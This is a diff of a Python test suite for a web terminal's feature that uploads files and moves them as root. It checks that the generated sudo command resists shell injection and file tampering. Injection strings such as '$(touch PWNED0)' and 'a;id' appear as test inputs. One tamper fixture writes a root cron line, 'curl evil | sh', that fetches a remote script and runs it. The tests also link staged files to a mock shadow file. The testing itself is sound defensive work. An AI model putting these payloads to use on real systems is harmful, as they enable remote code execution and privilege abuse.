@@ -1,20 +1,26 @@
 """3.6.9 — uploads into folders the agent's user cannot write, and agents on a too-old Python.
 
 Hermetic (temp DB, fake agent, no network). Covers:
-  * rootmove: strerror sanitising, folder/name validation, the generated inbox names, the
-    `sudo install` command and its shlex round-trip — including injection attempts (quotes, $(),
-    backticks, newlines, ESC, bidi overrides, NUL) — and the command EXECUTED by a real shell with a
-    fake `sudo`, to prove the names land literally and nothing in them runs;
+  * rootmove: strerror sanitising, folder/name/user validation, the generated inbox names, the
+    `sudo sh -c` command and its shlex round-trip — including injection attempts (quotes, $(),
+    backticks, newlines, ESC, bidi overrides, NUL) — the plans (owner index, expiry, eviction), and
+    the command EXECUTED by a real shell with a fake `sudo` (as root: reading as `nobody` through
+    setpriv): names land literally, nothing in them runs, mode 0644, and a staged file swapped for
+    other content, a symlink, a hardlink or /dev/zero after staging is refused with nothing landing
+    (review M1);
   * error mapping: files.failedReason / files.agentInternal, and the write-error enrichment
     ({user, dir[, mode]}) with a fake agent;
-  * the route POST /api/hosts/{id}/fs/root-move: authentication, authorization (Viewer refused,
-    Operator/Owner allowed, an Operator scoped to another host refused), validation, the agent's
-    inbox path checked, the audit entry;
+  * the routes POST /api/hosts/{id}/fs/root-move and …/{plan_id}/command: authentication,
+    authorization (Viewer refused, Operator/Owner allowed, an Operator scoped to another host
+    refused), validation, the agent's inbox path and user checked, only the planner may upload into
+    a staged file or get its command, the command carries the SHA-256 of the bytes that streamed
+    through the gateway, and every way that hash could be incomplete yields no command;
   * the upload route returning the enriched code end to end;
   * core.agent_python_old: the os.scandir fingerprint, the OS hint, the fs_list probe settling it,
     and the System health check.
 """
 import asyncio
+import hashlib
 import os
 import shlex
 import shutil
@@ -72,73 +78,262 @@ def pure_checks():
           rootmove._INBOX_NAME_RE.match(n1) is not None and n1.startswith("1970-01-01_00-00-00_root-move_"), n1)
     check("inbox_name: random part differs", rootmove.inbox_name(0) != rootmove.inbox_name(0))
 
-    plan = rootmove.build(INBOX, "/srv/it's $(x)", NASTY)
-    srcs = [u["upload_path"] for u in plan["uploads"]]
-    check("build: one staged file per name, all under the inbox, names never in the staged path",
+
+    ups = rootmove.staged_paths(INBOX, NASTY)
+    srcs = [u["upload_path"] for u in ups]
+    check("staged_paths: one staged file per name, all under the inbox, names never in the staged path",
           len(srcs) == len(NASTY) and all(s.startswith(INBOX + "/") for s in srcs)
           and not any(n in s.rsplit("/", 1)[1] for n, s in zip(NASTY, srcs) if len(n) > 2))
-    argv = shlex.split(plan["command"])
-    want = []
+    items = [dict(u, size=i, sha256="%064x" % i) for i, u in enumerate(ups)]
+    cmd = rootmove.command("webterm", INBOX, "/srv/it's $(x)", items)
+    argv = shlex.split(cmd)
+    want = ["sudo", "sh", "-c", rootmove.MOVE_SCRIPT, "webterm-move", "webterm", "/srv/it's $(x)"]
     for i, (n, s) in enumerate(zip(NASTY, srcs)):
-        if i:
-            want.append("&&")
-        want += ["sudo", "install", "-m", "0644", "--", s, "/srv/it's $(x)/" + n]
-    want += ["&&", "rm", "-f", "--"] + srcs
-    check("build: the command parses to EXACTLY the intended argv", argv == want)
-    check("build: no newline / control characters in the command",
-          "\n" not in plan["command"] and not rootmove.has_bad_chars(plan["command"]))
-    check("build: root folder → /<name>", shlex.split(rootmove.build(INBOX, "/", ["a"])["command"])[6] == "/a")
+        want += [s, str(i), "%064x" % i, "/srv/it's $(x)/" + n]
+    check("command: parses to EXACTLY the intended argv (script constant, values positional)", argv == want)
+    check("command: no newline / control characters in the command",
+          "\n" not in cmd and not rootmove.has_bad_chars(cmd))
+    check("command: the script is a constant without single quotes or newlines",
+          "'" not in rootmove.MOVE_SCRIPT and "\n" not in rootmove.MOVE_SCRIPT)
+    check("command: reads as the agent's user, checks the SHA-256, mv -T, removes the temp on failure",
+          'sudo -u "$u" -- head -c "$z" -- "$s"' in rootmove.MOVE_SCRIPT
+          and '[ "${x%% *}" = "$h" ]' in rootmove.MOVE_SCRIPT and "mv -f -T --" in rootmove.MOVE_SCRIPT
+          and "trap c EXIT" in rootmove.MOVE_SCRIPT and "sudo install" not in rootmove.MOVE_SCRIPT)
+    one = rootmove.staged_paths(INBOX, ["a"])
+    one_cmd = rootmove.command("webterm", INBOX, "/", [dict(one[0], size=1, sha256="0" * 64)])
+    check("command: root folder → /<name>", shlex.split(one_cmd)[-1] == "/a")
     for bad, what in ((["a", "a"], "duplicates"), ([], "no files"), (["x"] * 21, "too many")):
         try:
-            rootmove.build(INBOX, "/srv", bad)
-            check("build: refuses " + what, False)
+            rootmove.staged_paths(INBOX, bad)
+            check("staged_paths: refuses " + what, False)
         except rootmove.MoveError:
-            check("build: refuses " + what, True)
+            check("staged_paths: refuses " + what, True)
     for inbox in ("relative/.webterm/inbox", "/home/x/other", "/home/x/.webterm/inbox/", "/a\n/.webterm/inbox", ""):
         try:
-            rootmove.build(inbox, "/srv", ["a"])
-            check("build: refuses agent inbox %r" % inbox, False)
+            rootmove.staged_paths(inbox, ["a"])
+            check("staged_paths: refuses agent inbox %r" % inbox, False)
         except rootmove.MoveError:
-            check("build: refuses agent inbox %r" % inbox, True)
+            check("staged_paths: refuses agent inbox %r" % inbox, True)
+    good = dict(one[0], size=1, sha256="0" * 64)
+    for user in ("", None, "-rf", "#0", "root$", "a b", "a;id", "$(id)", "Web", "x" * 33, "a\nb"):
+        try:
+            rootmove.command(user, INBOX, "/srv", [good])
+            check("command: refuses agent user %r" % (user,), False)
+        except rootmove.MoveError:
+            check("command: refuses agent user %r" % (user,), True)
+    for it, what in ((dict(good, upload_path=INBOX + "/evil"), "a staged path WebTerm did not generate"),
+                     (dict(good, upload_path="/etc/shadow"), "a path outside the inbox"),
+                     (dict(good, sha256="Z" * 64), "a bad hash"), (dict(good, sha256=None), "no hash"),
+                     (dict(good, size=-1), "a negative size"), (dict(good, size=True), "a bool size"),
+                     (dict(good, size="1"), "a string size"), (dict(good, name="a/b"), "a path as name")):
+        try:
+            rootmove.command("webterm", INBOX, "/srv", [it])
+            check("command: refuses " + what, False)
+        except rootmove.MoveError:
+            check("command: refuses " + what, True)
+    try:
+        rootmove.command("webterm", INBOX, "/srv", [good, dict(good)])
+        check("command: refuses duplicate names", False)
+    except rootmove.MoveError:
+        check("command: refuses duplicate names", True)
+
+    # plans: owner index, expiry, eviction
+    p, _ = rootmove.new_plan(7, 1, INBOX, "/srv", ["a", "b"], now=1000.0)
+    check("plan: staged paths are owned by the planner on that host",
+          rootmove.staged_owner(7, p["uploads"][0]["upload_path"]) == 1
+          and rootmove.staged_owner(8, p["uploads"][0]["upload_path"]) is None
+          and rootmove.staged_owner(7, "/etc/passwd") is None)
+    check("plan: found while live, gone after the TTL",
+          rootmove.get_plan(p["plan_id"], now=1001.0) is p
+          and rootmove.get_plan(p["plan_id"], now=1000.0 + rootmove.PLAN_TTL + 1) is None)
+    rootmove.drop_plan(p["plan_id"])
+    check("plan: dropped → its staged paths are free", rootmove.staged_owner(7, p["uploads"][0]["upload_path"]) is None)
+    saved = rootmove.MAX_PLANS
+    rootmove.MAX_PLANS = 2
+    try:
+        p1, _ = rootmove.new_plan(7, 1, INBOX, "/srv", ["a"], now=2000.0)
+        p2, _ = rootmove.new_plan(7, 1, INBOX, "/srv", ["a"], now=2001.0)
+        p3, dropped = rootmove.new_plan(7, 1, INBOX, "/srv", ["a"], now=2002.0)
+        check("plan: beyond MAX_PLANS the oldest is evicted (and reported)",
+              [d["plan_id"] for d in dropped] == [p1["plan_id"]] and rootmove.get_plan(p1["plan_id"], now=2003.0) is None
+              and rootmove.get_plan(p3["plan_id"], now=2003.0) is p3)
+        for q in (p2, p3):
+            rootmove.drop_plan(q["plan_id"])
+    finally:
+        rootmove.MAX_PLANS = saved
+
+
+def _sha(b: bytes) -> str:
+    return hashlib.sha256(b).hexdigest()
 
 
 def shell_checks():
-    """The command, run by a real /bin/sh with a fake `sudo` (exec "$@"): every nasty name lands
-    literally, nothing in a name or the folder executes, staged files are removed."""
+    """The command, run by a real /bin/sh with a fake `sudo`. Without root: `sudo -u U --` runs the
+    command as the test user. As root with setpriv: as `nobody`, which proves the staged file is
+    read as the agent's user, not as root."""
     print("── rootmove: the command executed by a real shell")
-    base = tempfile.mkdtemp()
+    as_root = os.geteuid() == 0 and shutil.which("setpriv") is not None
     try:
-        inbox = os.path.join(base, "home", ".webterm", "inbox")
+        import pwd
+        nobody = pwd.getpwnam("nobody")
+    except (ImportError, KeyError):
+        nobody = None
+    as_root = as_root and nobody is not None
+    agent_user = "nobody" if as_root else "webterm"
+    base = tempfile.mkdtemp()
+    os.chmod(base, 0o755)
+    try:
+        home = os.path.join(base, "home")
+        inbox = os.path.join(home, ".webterm", "inbox")
         target = os.path.join(base, "srv", "it's $(touch PWNED0) `touch PWNED00`")
         os.makedirs(inbox)
         os.makedirs(target)
+        for d in (home, os.path.join(home, ".webterm"), inbox, os.path.dirname(target)):
+            os.chmod(d, 0o755)
+        if as_root:
+            os.chown(inbox, nobody.pw_uid, nobody.pw_gid)      # the agent's user owns its inbox
         bindir = os.path.join(base, "bin")
         os.makedirs(bindir)
         with open(os.path.join(bindir, "sudo"), "w") as f:
-            f.write('#!/bin/sh\nexec "$@"\n')
+            f.write('#!/bin/sh\n'
+                    'if [ "$1" = -u ]; then u=$2; shift 2; [ "$1" = -- ] && shift\n'
+                    '  if [ -n "${WT_SETPRIV:-}" ]; then\n'
+                    '    exec setpriv --reuid="$(id -u "$u")" --regid="$(id -g "$u")" --clear-groups -- "$@"\n'
+                    '  fi\n'
+                    'fi\n'
+                    'exec "$@"\n')
         os.chmod(os.path.join(bindir, "sudo"), 0o755)
-        plan = rootmove.build(inbox, target, NASTY)
-        for i, u in enumerate(plan["uploads"]):
-            with open(u["upload_path"], "w") as f:
-                f.write("content-%d" % i)
         env = dict(os.environ, PATH=bindir + ":" + os.environ.get("PATH", "/usr/bin:/bin"))
-        r = subprocess.run(["/bin/sh", "-c", plan["command"]], cwd=base, env=env,
-                           capture_output=True, text=True, timeout=30)
-        check("shell: the command succeeds", r.returncode == 0, r.stderr[-300:])
-        landed = sorted(os.listdir(target))
+        if as_root:
+            env["WT_SETPRIV"] = "1"
+
+        def stage(names, contents):
+            ups = rootmove.staged_paths(inbox, names)
+            items = []
+            for u, c in zip(ups, contents):
+                with open(u["upload_path"], "wb") as f:
+                    f.write(c)
+                os.chmod(u["upload_path"], 0o644)
+                if as_root:
+                    os.chown(u["upload_path"], nobody.pw_uid, nobody.pw_gid)
+                items.append(dict(u, size=len(c), sha256=_sha(c)))
+            return items
+
+        def run(items, timeout=30):
+            cmd = rootmove.command(agent_user, inbox, target, items)
+            return subprocess.run(["/bin/sh", "-c", cmd], cwd=base, env=env,
+                                  capture_output=True, text=True, timeout=timeout)
+
+        def temps():
+            return [n for n in os.listdir(target) if n.startswith(".webterm-move.")]
+
+        contents = [("content-%d\n" % i).encode() for i in range(len(NASTY))]
+        items = stage(NASTY, contents)
+        r = run(items)
+        check("shell: the command succeeds (%s)" % ("as root, reading as nobody" if as_root else "fake sudo"),
+              r.returncode == 0, r.stderr[-300:])
+        landed = sorted(n for n in os.listdir(target))
         check("shell: every name landed literally in the target folder", landed == sorted(NASTY), landed)
-        ok_content = all(open(os.path.join(target, n)).read() == "content-%d" % i for i, n in enumerate(NASTY))
+        ok_content = all(open(os.path.join(target, n), "rb").read() == contents[i] for i, n in enumerate(NASTY))
         check("shell: each file has its own content", ok_content)
         check("shell: installed with mode 0644",
               all(oct(os.stat(os.path.join(target, n)).st_mode & 0o777) == "0o644" for n in NASTY))
+        check("shell: owned by the user running the command (root when run as root)",
+              all(os.stat(os.path.join(target, n)).st_uid == os.geteuid() for n in NASTY))
         check("shell: the staged inbox files were removed", os.listdir(inbox) == [])
+        check("shell: no temp file left behind", temps() == [])
+        for n in NASTY:
+            os.unlink(os.path.join(target, n))
+
+        # ── tampering after staging: each must be refused, nothing lands, no temp left ──
+        secret = os.path.join(base, "secret")
+        with open(secret, "wb") as f:
+            f.write(b"root:$6$hash:19000:0:99999:7:::\n")
+        os.chmod(secret, 0o600)
+
+        def refused(what, mutate, name="victim.conf", content=b"good content\n", same_as_secret=False):
+            if same_as_secret:
+                content = open(secret, "rb").read()
+            it = stage([name], [content])
+            mutate(it[0]["upload_path"])
+            try:
+                r = run(it, timeout=20)
+                rc, err = r.returncode, r.stderr
+            except subprocess.TimeoutExpired:
+                rc, err = "timeout", ""
+            check("tamper: %s → refused, nothing lands, no temp left" % what,
+                  rc not in (0, "timeout") and not os.path.lexists(os.path.join(target, name)) and temps() == []
+                  and "NOT installed" in err, (rc, err[-200:], os.listdir(target)))
+            for n in os.listdir(inbox):
+                os.unlink(os.path.join(inbox, n))
+
+        def swap_content(p):
+            with open(p, "wb") as f:
+                f.write(b"* * * * * root curl evil | sh\n")
+
+        def swap_symlink(p):
+            os.unlink(p)
+            os.symlink(secret, p)
+
+        def swap_hardlink(p):
+            os.unlink(p)
+            os.link(secret, p)
+
+        def swap_zero(p):
+            os.unlink(p)
+            os.symlink("/dev/zero", p)
+
+        def append(p):
+            with open(p, "ab") as f:
+                f.write(b"extra")
+
+        def remove(p):
+            os.unlink(p)
+
+        refused("content swapped (another upload over the staged file)", swap_content)
+        refused("symlink to a secret file", swap_symlink)
+        refused("hardlink to a secret file", swap_hardlink)
+        refused("symlink to /dev/zero (at most <size> bytes read, no disk fill)", swap_zero)
+        refused("staged file deleted", remove)
+        # bytes appended: only <size> bytes are read, so what lands is EXACTLY what was uploaded
+        it = stage(["grown.conf"], [b"uploaded\n"])
+        append(it[0]["upload_path"])
+        r = run(it)
+        check("tamper: bytes appended → only the uploaded bytes land (head -c <size>)",
+              r.returncode == 0 and open(os.path.join(target, "grown.conf"), "rb").read() == b"uploaded\n", r.stderr[-200:])
+        os.unlink(os.path.join(target, "grown.conf"))
+        if as_root:
+            # the hash WOULD match here (same bytes) — only reading as the agent's user stops it
+            refused("symlink to a root-only file with the SAME bytes (read as the agent's user fails)",
+                    swap_symlink, same_as_secret=True)
+            refused("hardlink to a root-only file with the SAME bytes", swap_hardlink, same_as_secret=True)
+        else:
+            check("tamper: read-as-agent-user test skipped (needs root + setpriv)", True)
+
+        # the destination is an existing directory: mv -T refuses, nothing is moved INTO it
+        os.makedirs(os.path.join(target, "adir"))
+        it = stage(["adir"], [b"x"])
+        r = run(it)
+        check("dest is a directory → refused, nothing moved into it, no temp left",
+              r.returncode != 0 and os.listdir(os.path.join(target, "adir")) == [] and temps() == [], r.stderr[-200:])
+        os.rmdir(os.path.join(target, "adir"))
+        for n in os.listdir(inbox):
+            os.unlink(os.path.join(inbox, n))
+
+        # two files, the second tampered: the first lands, the second does not, the command stops
+        it = stage(["one.txt", "two.txt"], [b"1", b"2"])
+        swap_content(it[1]["upload_path"])
+        r = run(it)
+        check("two files, the second swapped → first installed, second refused, exit != 0",
+              r.returncode != 0 and open(os.path.join(target, "one.txt"), "rb").read() == b"1"
+              and not os.path.exists(os.path.join(target, "two.txt")) and temps() == [], r.stderr[-200:])
+
         pwned = []
-        for root, _dirs, files in os.walk(base):
+        for _root, _dirs, files in os.walk(base):
             pwned += [f for f in files if f.startswith("PWNED")]
         check("shell: nothing in a name or the folder was executed", not pwned, pwned)
     finally:
         shutil.rmtree(base, ignore_errors=True)
-
 
 # ── fake agent ───────────────────────────────────────────────────────────────────────────────
 class FakeAgent(core.AgentConnection):
@@ -236,8 +431,20 @@ async def mapping_checks():
     return owner, hid
 
 
+async def _upload(client, hid, path, chunks, uid="b" * 32, commit=True):
+    off = 0
+    for c in chunks:
+        r = await client.post("/api/hosts/%d/fs/upload?path=%s&upload_id=%s&offset=%d" % (hid, path, uid, off), content=c)
+        if r.status_code != 200:
+            return r
+        off += len(c)
+    if not commit:
+        return r
+    return await client.post("/api/hosts/%d/fs/upload/commit?path=%s&upload_id=%s" % (hid, path, uid))
+
+
 async def route_checks(owner, hid):
-    print("── POST /fs/root-move")
+    print("── POST /fs/root-move + …/command")
     url = "/api/hosts/%d/fs/root-move" % hid
     fake = FakeAgent(hid, deny={"/srv/bin/lists"})
     core.sources[hid] = fake
@@ -259,19 +466,107 @@ async def route_checks(owner, hid):
         check("Operator scoped to ANOTHER host → refused", r.status_code in (403, 404), r.status_code)
         r = await op.post(url, json={"dir": "/srv/bin/lists", "names": ["list.txt"]})
         j = r.json()
-        check("Operator with files.write → 200 + plan", r.status_code == 200 and j.get("command"), r.text[:200])
+        check("Operator with files.write → 200 + plan (no command before the upload)",
+              r.status_code == 200 and j.get("plan_id") and "command" not in j, r.text[:200])
+
         r = await owner.post(url, json={"dir": "/srv/bin/lists", "names": ["it's", "$(id)"]})
         j = r.json()
-        check("Owner → 200; command round-trips to the intended argv",
-              r.status_code == 200 and shlex.split(j["command"])[:7]
-              == ["sudo", "install", "-m", "0644", "--", j["uploads"][0]["upload_path"], "/srv/bin/lists/it's"],
-              j)
-        check("staged files are in the agent's inbox, named by WebTerm",
-              all(u["upload_path"].startswith(INBOX + "/") and "root-move_" in u["upload_path"] for u in j["uploads"]))
+        plan_id, ups = j.get("plan_id"), j.get("uploads") or []
+        check("Owner → 200; staged files in the agent's inbox, named by WebTerm",
+              r.status_code == 200 and len(ups) == 2
+              and all(u["upload_path"].startswith(INBOX + "/") and "root-move_" in u["upload_path"] for u in ups), j)
         check("the agent was asked to create its inbox", ("fs_mkdir", {"path": rootmove.INBOX_REL, "parents": True}) in fake.calls)
         row = await db.fetchone("SELECT detail FROM audit_log WHERE path=? ORDER BY id DESC LIMIT 1", url)
-        check("audited: 'upload and move as root … (command typed, not run)'",
-              row and "move as root" in row["detail"] and "not run" in row["detail"], row and row["detail"])
+        check("audited: 'upload and move as root … (planned)'",
+              row and "move as root" in row["detail"] and "planned" in row["detail"], row and row["detail"])
+        cmd_url = "%s/%s/command" % (url, plan_id)
+
+        r = await owner.post(cmd_url)
+        check("command before the uploads → 409 files.rootMoveNotStaged",
+              r.status_code == 409 and r.json().get("code") == "files.rootMoveNotStaged", r.text[:160])
+        r = await op.post("/api/hosts/%d/fs/upload?path=%s&upload_id=%s&offset=0" % (hid, ups[0]["upload_path"], "c" * 32),
+                          content=b"evil")
+        check("another user uploading into a staged file → 403 files.rootMoveForeign",
+              r.status_code == 403 and r.json().get("code") == "files.rootMoveForeign", (r.status_code, r.text[:160]))
+        for sub in ("status", "commit"):
+            meth = op.get if sub == "status" else op.post
+            r = await meth("/api/hosts/%d/fs/upload/%s?path=%s&upload_id=%s" % (hid, sub, ups[0]["upload_path"], "c" * 32))
+            check("another user: upload/%s on a staged file → 403" % sub, r.status_code == 403, r.status_code)
+        r = await op.delete("/api/hosts/%d/fs/upload?path=%s&upload_id=%s" % (hid, ups[0]["upload_path"], "c" * 32))
+        check("another user: abort on a staged file → 403", r.status_code == 403, r.status_code)
+
+        data = [b"#!/bin/sh\necho one\n", b"second file\n"]
+        r1 = await _upload(owner, hid, ups[0]["upload_path"], [data[0][:7], data[0][7:]])
+        r2 = await _upload(owner, hid, ups[1]["upload_path"], [data[1]], uid="d" * 32)
+        check("the planner uploads both (chunked) and commits", r1.status_code == 200 and r2.status_code == 200,
+              (r1.status_code, r2.status_code, r2.text[:120]))
+        r = await op.post(cmd_url)
+        check("another user asking for the command → 404 (not theirs)", r.status_code == 404, r.status_code)
+        r = await owner.post(cmd_url)
+        j = r.json()
+        argv = shlex.split(j.get("command", ""))
+        want = ["sudo", "sh", "-c", rootmove.MOVE_SCRIPT, "webterm-move", "webterm", "/srv/bin/lists",
+                ups[0]["upload_path"], str(len(data[0])), hashlib.sha256(data[0]).hexdigest(), "/srv/bin/lists/it's",
+                ups[1]["upload_path"], str(len(data[1])), hashlib.sha256(data[1]).hexdigest(), "/srv/bin/lists/$(id)"]
+        check("command: the SHA-256 and size of the bytes that went through the gateway, round-trips exactly",
+              r.status_code == 200 and argv == want, (r.status_code, argv[4:]))
+        row = await db.fetchone("SELECT detail FROM audit_log WHERE path=? ORDER BY id DESC LIMIT 1", cmd_url)
+        check("audited: the command (typed or copied, not run)", row and "not run" in row["detail"], row and row["detail"])
+        r = await owner.post(cmd_url)
+        check("the plan is used up: a second command → 404 files.rootMoveGone",
+              r.status_code == 404 and r.json().get("code") == "files.rootMoveGone", r.status_code)
+        r = await owner.post("/api/hosts/%d/fs/upload?path=%s&upload_id=%s&offset=0" % (hid, ups[0]["upload_path"], "e" * 32),
+                             content=b"x")
+        check("after the plan: the path is an ordinary path again (no owner lock)", r.status_code == 200, r.status_code)
+
+        # broken hashes: no command
+        async def broken(what, act):
+            r = await owner.post(url, json={"dir": "/srv/bin/lists", "names": ["f.conf"]})
+            p = r.json()
+            path = p["uploads"][0]["upload_path"]
+            await act(path)
+            r = await owner.post("%s/%s/command" % (url, p["plan_id"]))
+            check("no command when %s → 409 files.rootMoveNotStaged" % what,
+                  r.status_code == 409 and r.json().get("code") == "files.rootMoveNotStaged", (r.status_code, r.text[:120]))
+
+        async def two_ids(path):
+            await _upload(owner, hid, path, [b"abc"], uid="1" * 32, commit=False)
+            await _upload(owner, hid, path, [b"abc"], uid="2" * 32)
+
+        async def one_shot(path):
+            await owner.post("/api/hosts/%d/fs/upload?path=%s" % (hid, path), content=b"abc")
+
+        async def not_committed(path):
+            await _upload(owner, hid, path, [b"abc"], commit=False)
+
+        async def resumed_after_restart(path):
+            await _upload(owner, hid, path, [b"abc"], uid="3" * 32, commit=False)
+            core.stage_track(hid, path)              # a fresh hash state, as after a gateway restart
+            await owner.post("/api/hosts/%d/fs/upload?path=%s&upload_id=%s&offset=3" % (hid, path, "3" * 32), content=b"def")
+            await owner.post("/api/hosts/%d/fs/upload/commit?path=%s&upload_id=%s" % (hid, path, "3" * 32))
+
+        await broken("two upload ids went into one staged file", two_ids)
+        await broken("the staged file was written one-shot (not hashed)", one_shot)
+        await broken("the upload never committed", not_committed)
+        await broken("the hash state missed the first bytes (resume after a restart)", resumed_after_restart)
+
+        r = await owner.post(url, json={"dir": "/srv/bin/lists", "names": ["z"]})
+        p = r.json()
+        await _upload(owner, hid, p["uploads"][0]["upload_path"], [b"zz"], uid="4" * 32, commit=False)
+        await owner.delete("/api/hosts/%d/fs/upload?path=%s&upload_id=%s" % (hid, p["uploads"][0]["upload_path"], "4" * 32))
+        await _upload(owner, hid, p["uploads"][0]["upload_path"], [b"zz2"], uid="5" * 32)
+        r = await owner.post("%s/%s/command" % (url, p["plan_id"]))
+        check("aborted and uploaded again (new id) → the command hashes the new bytes",
+              r.status_code == 200 and hashlib.sha256(b"zz2").hexdigest() in r.json().get("command", ""), r.text[:120])
+
+        # the agent's user: unknown or odd → no plan at all
+        for au, what in ((None, "unknown"), ("web term", "with a space"), ("-x", "an option"), ("root$(id)", "with $()")):
+            await db.execute("UPDATE hosts SET agent_user=? WHERE id=?", au, hid)
+            r = await owner.post(url, json={"dir": "/srv/bin/lists", "names": ["a"]})
+            check("agent user %s → 409 files.rootMoveNoUser" % what,
+                  r.status_code == 409 and r.json().get("code") == "files.rootMoveNoUser", (r.status_code, r.text[:120]))
+        await db.execute("UPDATE hosts SET agent_user='webterm' WHERE id=?", hid)
+
         for body, what in (({"dir": "srv/x", "names": ["a"]}, "relative folder"),
                            ({"dir": "/srv/x\n", "names": ["a"]}, "newline in folder"),
                            ({"dir": "/srv/x", "names": ["a\nb"]}, "newline in name"),
@@ -286,8 +581,10 @@ async def route_checks(owner, hid):
         check("more than 20 names → 422", r.status_code == 422, r.status_code)
         fake.inbox = "/tmp/evil"
         r = await owner.post(url, json={"dir": "/srv/x", "names": ["a"]})
-        check("an unexpected inbox path from the agent → refused (no command)",
-              r.status_code == 400 and "command" not in r.json(), r.text[:120])
+        check("an unexpected inbox path from the agent → refused (no plan)",
+              r.status_code == 400 and "plan_id" not in r.json(), r.text[:120])
+        r = await owner.post("%s/%s/command" % (url, "0" * 32))
+        check("an unknown plan id → 404", r.status_code == 404, r.status_code)
     finally:
         core.sources.pop(hid, None)
 
